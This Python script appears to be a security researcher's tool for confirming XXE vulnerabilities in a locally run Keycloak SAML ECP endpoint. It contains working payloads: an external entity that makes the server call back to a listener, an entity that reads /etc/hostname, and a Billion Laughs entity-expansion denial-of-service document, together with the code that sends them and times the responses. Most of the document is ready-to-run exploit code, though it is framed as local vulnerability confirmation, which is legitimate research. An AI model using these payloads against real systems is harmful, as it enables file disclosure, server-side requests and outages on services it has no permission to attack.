#!/usr/bin/env python3
"""
Phase 4 — Runtime XXE confirmation against Keycloak ECP endpoint.
Target: http://localhost:8080/realms/master/protocol/saml/ecp

Tests:
  1. OOB HTTP callback  — entity resolves to http://host.docker.internal:9001/xxe-oob
  2. In-band file read  — entity resolves to file:///etc/hostname
  3. Billion Laughs     — quadratic entity expansion; >5x baseline = expansion not blocked
  4. Baseline           — clean SAML ECP AuthnRequest; establishes timing reference
"""

import socket
import sys
import threading
import time
import urllib.error
import urllib.request

TARGET = "http://localhost:8080/realms/master/protocol/saml"
HEADERS = {"Content-Type": "application/soap+xml"}
OOB_HOST = "host.docker.internal"  # Docker Desktop host alias, resolvable from container
OOB_PORT = 9001


# ── HTTP helper ────────────────────────────────────────────────────────────────

def post(body: bytes, timeout: int = 15):
    req = urllib.request.Request(TARGET, data=body, headers=HEADERS, method="POST")
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            elapsed = time.monotonic() - t0
            return resp.status, resp.read(4096), elapsed
    except urllib.error.HTTPError as e:
        elapsed = time.monotonic() - t0
        return e.code, e.read(4096), elapsed
    except Exception as exc:
        elapsed = time.monotonic() - t0
        return None, str(exc).encode(), elapsed


def run_test(label: str, body: bytes, *, baseline_time: float = None, timeout: int = 15):
    SEP = "=" * 68
    print(f"\n{SEP}")
    print(f"  {label}")
    print(SEP)
    status, raw, elapsed = post(body, timeout=timeout)
    text = raw.decode("utf-8", errors="replace")[:500]
    print(f"  HTTP status : {status}")
    timing_note = ""
    if baseline_time and baseline_time > 0:
        ratio = elapsed / baseline_time
        timing_note = f"  ({ratio:.1f}x baseline)"
        if ratio > 5:
            timing_note += "  *** ENTITY EXPANSION NOT BLOCKED ***"
    print(f"  Elapsed     : {elapsed:.3f}s{timing_note}")
    print(f"  Body (first 500 chars):")
    for ln in text.splitlines():
        print(f"    {ln}")
    return elapsed


# ── SOAP payloads ──────────────────────────────────────────────────────────────

BASELINE_SOAP = b"""\
<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
  <S:Header>
    <ecp:Request xmlns:ecp="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"
                 S:mustUnderstand="1" IsPassive="0">
      <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        >http://localhost/sp</saml:Issuer>
    </ecp:Request>
    <paos:Request xmlns:paos="urn:liberty:paos:2003-08"
                  S:mustUnderstand="1"
                  S:actor="http://schemas.xmlsoap.org/soap/actor/next"
                  responseConsumerURL="http://localhost/acs"
                  service="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"/>
  </S:Header>
  <S:Body>
    <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                        xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                        ID="_baseline001" Version="2.0"
                        IssueInstant="2026-05-07T00:00:00Z"
                        AssertionConsumerServiceURL="http://localhost/acs">
      <saml:Issuer>http://localhost/sp</saml:Issuer>
    </samlp:AuthnRequest>
  </S:Body>
</S:Envelope>"""

FILE_READ_SOAP = b"""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
  <S:Header>
    <ecp:Request xmlns:ecp="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"
                 S:mustUnderstand="1" IsPassive="0">
      <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
    </ecp:Request>
    <paos:Request xmlns:paos="urn:liberty:paos:2003-08"
                  S:mustUnderstand="1"
                  S:actor="http://schemas.xmlsoap.org/soap/actor/next"
                  responseConsumerURL="http://localhost/acs"
                  service="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"/>
  </S:Header>
  <S:Body>
    <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                        xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                        ID="_fileread001" Version="2.0"
                        IssueInstant="2026-05-07T00:00:00Z"
                        AssertionConsumerServiceURL="http://localhost/acs">
      <saml:Issuer>http://localhost/sp</saml:Issuer>
    </samlp:AuthnRequest>
  </S:Body>
</S:Envelope>"""

BILLION_LAUGHS_SOAP = b"""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol  "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
  <S:Header>
    <ecp:Request xmlns:ecp="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"
                 S:mustUnderstand="1" IsPassive="0">
      <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&lol9;</saml:Issuer>
    </ecp:Request>
    <paos:Request xmlns:paos="urn:liberty:paos:2003-08"
                  S:mustUnderstand="1"
                  S:actor="http://schemas.xmlsoap.org/soap/actor/next"
                  responseConsumerURL="http://localhost/acs"
                  service="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"/>
  </S:Header>
  <S:Body>
    <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                        xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                        ID="_lolz001" Version="2.0"
                        IssueInstant="2026-05-07T00:00:00Z"
                        AssertionConsumerServiceURL="http://localhost/acs">
      <saml:Issuer>http://localhost/sp</saml:Issuer>
    </samlp:AuthnRequest>
  </S:Body>
</S:Envelope>"""


def make_oob_soap(host: str, port: int) -> bytes:
    url = f"http://{host}:{port}/xxe-oob"
    return f"""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>
<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
  <S:Header>
    <ecp:Request xmlns:ecp="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"
                 S:mustUnderstand="1" IsPassive="0">
      <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
    </ecp:Request>
    <paos:Request xmlns:paos="urn:liberty:paos:2003-08"
                  S:mustUnderstand="1"
                  S:actor="http://schemas.xmlsoap.org/soap/actor/next"
                  responseConsumerURL="http://localhost/acs"
                  service="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"/>
  </S:Header>
  <S:Body>
    <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                        xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                        ID="_oob001" Version="2.0"
                        IssueInstant="2026-05-07T00:00:00Z"
                        AssertionConsumerServiceURL="http://localhost/acs">
      <saml:Issuer>http://localhost/sp</saml:Issuer>
    </samlp:AuthnRequest>
  </S:Body>
</S:Envelope>""".encode()


# ── OOB listener ───────────────────────────────────────────────────────────────

oob_received = threading.Event()
oob_records: list = []


def oob_listener():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", OOB_PORT))
        srv.listen(5)
        srv.settimeout(12)
        try:
            conn, addr = srv.accept()
            data = conn.recv(4096)
            oob_records.append((addr, data))
            oob_received.set()
            conn.close()
        except socket.timeout:
            pass
        srv.close()
    except Exception as exc:
        oob_records.append(("error", str(exc).encode()))


# ── main ───────────────────────────────────────────────────────────────────────

def main():
    SEP = "=" * 68
    print(SEP)
    print("  Keycloak ECP XXE Confirmation")
    print(f"  Target : {TARGET}")
    print(f"  Python : {sys.version.split()[0]}")
    print(SEP)

    # Test 4: Baseline — must come first to calibrate timing
    baseline_t = run_test("Test 4 — Baseline (valid SAML ECP AuthnRequest)", BASELINE_SOAP)

    # Test 1: OOB HTTP callback
    print(f"\n{SEP}")
    print(f"  Test 1 — OOB HTTP callback  (entity → {OOB_HOST}:{OOB_PORT})")
    print(SEP)
    t = threading.Thread(target=oob_listener, daemon=True)
    t.start()
    time.sleep(0.15)  # let the listener bind before sending
    oob_soap = make_oob_soap(OOB_HOST, OOB_PORT)
    status, raw, elapsed = post(oob_soap)
    text = raw.decode("utf-8", errors="replace")[:500]
    print(f"  HTTP status : {status}")
    print(f"  Elapsed     : {elapsed:.3f}s")
    print(f"  Body (first 500 chars):")
    for ln in text.splitlines():
        print(f"    {ln}")
    t.join(timeout=12)
    if oob_received.is_set():
        addr, raw_cb = oob_records[0]
        print(f"\n  *** OOB CALLBACK RECEIVED from {addr} ***")
        print(f"  Data (first 200 bytes): {raw_cb[:200]!r}")
        print("  VERDICT: XXE CONFIRMED — SAAJ MessageFactory resolved external entity")
    else:
        if oob_records and oob_records[0][0] == "error":
            print(f"\n  Listener error: {oob_records[0][1].decode()}")
        print("\n  No callback within 12s.")
        print("  (DOCTYPE rejected by SAAJ provider  OR  container cannot reach host:9001)")

    # Test 2: In-band file read
    run_test("Test 2 — In-band file read  (file:///etc/hostname)", FILE_READ_SOAP)

    # Test 3: Billion Laughs
    run_test(
        "Test 3 — Billion Laughs  (entity expansion DoS)",
        BILLION_LAUGHS_SOAP,
        baseline_time=baseline_t,
        timeout=30,
    )

    print(f"\n{SEP}")
    print("  Done.")
    print(SEP)


if __name__ == "__main__":
    main()
